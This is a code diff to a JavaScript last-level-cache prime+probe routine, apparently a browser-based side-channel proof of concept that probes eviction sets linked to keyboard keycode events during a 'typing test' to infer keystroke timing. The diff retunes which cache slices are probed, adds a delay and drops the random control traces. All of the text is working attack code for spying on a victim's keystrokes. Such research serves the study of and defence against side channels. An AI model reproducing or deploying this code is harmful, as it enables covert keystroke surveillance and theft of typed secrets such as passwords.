@@ -707,18 +707,24 @@ async function l3pp_main(){
     /* compute detection rate */
     const TRANSMIT_ROUNDS_SIDE = 256
     intra_process_transmission_test(evset, buffer, WARMUP_ROUNDS, TRANSMIT_ROUNDS_SIDE, KBD_KEYCODE_VICTIM);
+
+    
+    await sleep(5000);
     
     /* typing test begins */
     log("typing test begins now")
 
     // log start measurement 
+    //
     let start_measurement = Math.floor(performance.now());
+
     log("start: "+start_measurement)
 
     const KEYSTROKE_BUFFER_SIZE = 1024 * 1024;
     const NUM_MEASUREMENTS_MS = 1024;
-    const KEYCODE_SLICE = 3
+    const KEYCODE_SLICE = 1
     const EVENT_SLICE = 3
+    const RANDOM_SLICE = KEYCODE_SLICE % 3 + 1;
 
     let keycode_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
     let event_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
@@ -745,12 +751,10 @@ async function l3pp_main(){
 
     while(num_traces < KEYSTROKE_BUFFER_SIZE){
         for(let i = 0; i < 8; i++){
-            let keycode_result = keycode_found_sets[KEYCODE_SLICE].probe();
-            let event_result = event_found_sets[EVENT_SLICE].probe(); 
-            let random_result = keycode_found_sets[0].probe(); 
+            let keycode_result = keycode_found_sets[3].probe();
+            let event_result = event_found_sets[3].probe(); 
             keycode_traces[num_traces] += (keycode_result << i); 
             event_traces[num_traces] += (event_result << i); 
-            random_traces[num_traces] += (random_result << i);
         }
         num_traces++;
     }
@@ -764,17 +768,13 @@ async function l3pp_main(){
         for(let j = 0; j < NUM_MEASUREMENTS_MS / 8; j++){
             let keycode_data = keycode_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
             let event_data = event_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
-            let random_data = random_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
             for(let l = 0; l < 8; l++){
                 let keycode_result = keycode_data & 1;
                 let event_result = event_data & 1;
-                let random_result = random_data & 1;
                 keycode_hit_count_per_ms[i] += keycode_result;
                 event_hit_count_per_ms[i] += event_result;
-                random_hit_count_per_ms[i] += random_result;
                 keycode_data >>= 1;
                 event_data >>= 1;
-                random_data >>= 1;
             }
         }
     }
